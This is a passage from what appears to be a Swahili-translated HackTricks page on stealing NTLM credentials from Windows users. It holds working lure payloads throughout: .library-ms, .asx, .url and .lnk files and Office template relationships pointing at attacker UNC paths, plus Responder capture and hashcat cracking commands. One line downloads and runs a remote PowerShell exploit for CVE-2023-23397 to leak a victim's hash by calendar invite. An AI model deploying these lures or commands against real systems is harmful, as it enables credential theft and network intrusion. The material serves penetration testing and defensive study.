# Mahali pa kuibia NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Angalia mawazo yote mazuri kutoka kwa [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) kutoka kwa kupakua faili la microsoft word mtandaoni hadi chanzo cha ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md na [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Share ya SMB inayoweza kuandikwa + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Ikiwa unaweza **kuandika kwenye share ambayo watumiaji au scheduled jobs hutembelea katika Explorer**, weka faili ambazo metadata yake inaonyesha UNC yako (kwa mfano `\\ATTACKER\share`). Kuonyesha folda huanzisha **uthibitishaji wa SMB usioonekana** na inaleaks **NetNTLMv2** kwa listener wako.

1. **Tengeneza vichocheo** (inajumuisha SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Weka yao kwenye writable share** (folder yoyote ambayo mwathiriwa ataifungua):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Sikiliza na crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows inaweza kugonga faili nyingi kwa wakati mmoja; chochote Explorer huonyesha awali (`BROWSE TO FOLDER`) hakihitaji kubofya.

### Windows Media Player playlists (.ASX/.WAX)

Iwapo unaweza kumfanya lengo kufungua au kuonyesha awali playlist ya Windows Media Player unayodhibiti, unaweza leak Net‑NTLMv2 kwa kuelekeza kipengele kwenye UNC path. WMP itajaribu kupata media iliyorejelewa kupitia SMB na itathibitisha moja kwa moja.

Mfano wa payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Mtiririko wa ukusanyaji na cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer hushughulikia .library-ms kwa njia isiyo salama wakati zinapofunguliwa moja kwa moja kutoka ndani ya ZIP archive. Endapo uainishaji wa library unaelekeza kwenye njia ya mbali ya UNC (e.g., \\attacker\share), kuvinjari/kuanzisha .library-ms ndani ya ZIP kunasababisha Explorer kuorodhesha UNC na kutoa uthibitisho wa NTLM kwa mshambuliaji. Hii inatoa NetNTLMv2 ambayo inaweza kuvunjwa offline au inawezekana kupelekwa kwa njia ya relay.

Mfano mdogo wa .library-ms unaoelekeza kwenye UNC ya mshambuliaji
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Hatua za operesheni
- Tengeneza faili .library-ms na XML iliyo hapo juu (weka IP/hostname yako).
- Zip it (on Windows: Send to → Compressed (zipped) folder) na peleka ZIP kwa lengo.
- Endesha NTLM capture listener na subiri waathiriwa kufungua .library-ms kutoka ndani ya ZIP.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows ilisindika property ya MAPI iliyopanuliwa PidLidReminderFileParameter kwenye vipengele vya kalenda. Ikiwa property hiyo inarejelea UNC path (mf., \\attacker\share\alert.wav), Outlook ingetuma ombi kwa SMB share wakati kikumbusho kinapopigwa, leaking Net‑NTLMv2 ya mtumiaji bila bofya yoyote. Hii ilirekebishwa tarehe 14 Machi, 2023, lakini bado inabaki kuwa muhimu kwa floti za vifaa za zamani/zisizoguswa na kwa majibu ya matukio ya kihistoria.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Upande wa Listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notes
- Mwanaathiriwa anahitaji tu Outlook for Windows kuwa inayoendeshwa wakati ukumbusho unapotekelezwa.
- The leak inatoa Net‑NTLMv2 inayofaa kwa offline cracking au relay (si pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer inaonyesha icon za shortcut kiotomatiki. Utafiti wa hivi karibuni ulionyesha kwamba hata baada ya patch ya Microsoft ya Aprili 2025 kwa UNC‑icon shortcuts, bado ilikuwa inawezekana kusababisha NTLM authentication bila kubofya kwa kuhost target ya shortcut kwenye UNC path na kuweka icon kwa eneo la ndani (patch bypass assigned CVE‑2025‑50154). Kutazama tu folda kunasababisha Explorer kuvuta metadata kutoka kwa target ya mbali, ikitoa NTLM kwa server ya mshambuliaji ya SMB.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program Shortcut payload (.lnk) kupitia PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Weka shortcut ndani ya ZIP na mfanye mwathiriwa kuitazama.
- Weka shortcut kwenye share inayoweza kuandikwa ambayo mwathiriwa atafungua.
- Changanya na faili nyingine za kuvutia katika folda ile ile ili Explorer itengeneze mwoneko wa awali wa vitu.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows loads `.lnk` metadata during **view/preview** (icon rendering), not only on execution. CVE‑2026‑25185 shows a parsing path where **ExtraData** blocks cause the shell to resolve an icon path and touch the filesystem **during load**, emitting outbound NTLM when the path is remote.

Key trigger conditions (observed in `CShellLink::_LoadFromStream`):
- Jumuisha **DARWIN_PROPS** (`0xa0000006`) katika ExtraData (mlango wa utaratibu wa kusasisha icon).
- Jumuisha **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) ambayo **TargetUnicode** imejazwa.
- Loader huopanua vigezo vya mazingira ndani ya `TargetUnicode` na huita `PathFileExistsW` kwenye njia iliyopatikana.

If `TargetUnicode` resolves to a UNC path (e.g., `\\attacker\share\icon.ico`), **merely viewing a folder** containing the shortcut causes outbound authentication. The same load path can also be hit by **indexing** and **AV scanning**, making it a practical no‑click leak surface.

Research tooling (parser/generator/UI) is available in the **LnkMeMaybe** project to build/inspect these structures without using the Windows GUI.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Nyaraka za Office zinaweza kurejelea template ya nje. Ikiwa utaweka template iliyoambatanishwa kwenye UNC path, kufungua nyaraka kutafanya uthibitishaji kwa SMB.

Minimal DOCX relationship changes (inside word/):

1) Hariri word/settings.xml na ongeza rejeleo la template iliyoambatanishwa:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Hariri word/_rels/settings.xml.rels na uelekeze rId1337 kwa UNC yako:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Pakia tena kama .docx na utoe. Endesha SMB capture listener yako na subiri kufunguliwa.

Kwa mawazo baada ya capture kuhusu relaying au abusing NTLM, angalia:

{{#ref}}
README.md
{{#endref}}


## Marejeo
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)


{{#include ../../banners/hacktricks-training.md}}
